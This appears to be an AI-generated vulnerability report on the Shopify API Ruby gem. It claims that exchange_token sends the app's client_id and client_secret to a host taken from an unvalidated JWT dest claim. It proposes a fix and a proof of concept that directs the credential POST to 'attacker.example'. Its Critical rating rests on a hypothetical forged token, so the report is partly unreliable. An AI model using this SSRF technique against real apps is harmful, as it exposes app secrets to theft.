Found the critical binding gap: this is a genuine, in-scope analog.

### Title
`ShopifyAPI::Auth::TokenExchange.exchange_token` sends `client_secret` to a host derived from the unvalidated JWT `dest` claim, bypassing the gem's own `ShopValidator` - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`TokenExchange.exchange_token` derives the target shop host from the session token's `dest` claim via `JwtPayload#shop` and uses that value directly to build the HTTP client that transmits the app's `client_id`/`client_secret` to `https://<dest_shop>/admin/oauth/access_token`, without ever passing it through `ShopifyAPI::Utils::ShopValidator.sanitize!`. The sibling method `migrate_to_expiring_token` in the same file does call `ShopValidator.sanitize!` on its `shop` input, showing the validator was added specifically to close this exact "unvalidated shop host receives credentials" gap, but the fix was not applied consistently to `exchange_token`.

### Finding Description
`JwtPayload#initialize` only checks that `aud == Context.api_key`; it never validates the format of the `dest`/`iss` claims [1](#0-0) . `JwtPayload#shop` simply strips `https://` from `@dest` and returns it verbatim [2](#0-1) .

`TokenExchange.exchange_token` takes this raw, unvalidated value (`dest_shop = jwt_payload.shop`) and uses it directly to construct `Auth::Session.new(shop: dest_shop)`, which in turn is passed to `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` — the client that issues the POST containing `client_id` and `client_secret` in its body [3](#0-2) .

Contrast this with `migrate_to_expiring_token` in the exact same module, which correctly calls `validated_shop = Utils::ShopValidator.sanitize!(shop)` before building the session/host that will receive the same `client_id`/`client_secret` payload [4](#0-3) . `ShopValidator` exists specifically to reject any host that is not on the `TRUSTED_SHOPIFY_DOMAINS` allowlist (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) [5](#0-4) , and the changelog confirms it was introduced precisely to guard the `dest` claim used by `exchange_token` [6](#0-5) .

This breaks the binding: **"host validated (via ShopValidator) == host that receives the app's `client_secret`."** For `migrate_to_expiring_token` this equality holds; for `exchange_token` it does not — the host that is trusted for credential transmission is only "whatever string decoding produced from the JWT's `dest` claim," not "a value proven to be a genuine `*.myshopify.com`/allowlisted host."

### Impact Explanation
If an app host ever forwards a session token whose `dest` claim is not constrained to a trusted Shopify domain (e.g., a malformed/relayed token, or any future signing path that does not strictly enforce `dest` format), `exchange_token` will happily use `HttpClient` to POST the app's `client_id` and `client_secret` to that arbitrary host — this is SSRF carrying the app's credentials, which can result in exfiltration of the app's `client_secret` to an attacker-controlled endpoint. This matches the Critical/High impact bucket for SSRF with the app's credentials / credential leakage, since the root cause is exactly the missing validator call that its sibling method demonstrates is the intended safeguard.

### Likelihood Explanation
Every call to `exchange_token` is affected, since the shop value is now unconditionally taken from `dest` and the `shop:` parameter is deprecated (logged and ignored for host construction) [7](#0-6) . There is no path in `exchange_token` that runs the `dest`-derived shop through `ShopValidator`, unlike `migrate_to_expiring_token`, making the gap structural and always reachable whenever `exchange_token` is invoked.

### Recommendation
In `lib/shopify_api/auth/token_exchange.rb`, validate `dest_shop` the same way `migrate_to_expiring_token` validates its `shop` argument:
```ruby
dest_shop = ShopifyAPI::Utils::ShopValidator.sanitize!(jwt_payload.shop)
```
so the host used to build `shop_session`/`Clients::HttpClient` for `exchange_token` is provably constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before the app's `client_secret` is sent to it.

### Proof of Concept
1. Add a call in a test that stubs `JwtPayload.new` (or crafts a token whose `dest` claim is an attacker-controlled string, e.g. `"attacker.example"`) and confirm `JwtPayload#initialize` accepts it (only `aud` is checked; `dest` format is unchecked) — see `test_decode_jwt_payload_succeeds_with_valid_token`-style setup in `test/auth/jwt_payload_test.rb`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_or_relayed_token, requested_token_type: ...)`.
3. Observe that `Clients::HttpClient.new(session: Auth::Session.new(shop: "attacker.example"), ...)` is constructed and the POST containing `client_id`/`client_secret` is issued toward `https://attacker.example/admin/oauth/access_token`, with no `ShopValidator.sanitize!` call intervening — unlike the equivalent flow in `migrate_to_expiring_token`, which raises `Errors::InvalidShopError` for the same input via `ShopValidator.sanitize!("attacker.example")` (see `test_rejects_attacker_controlled_domain` in `test/utils/shop_validator_test.rb`).
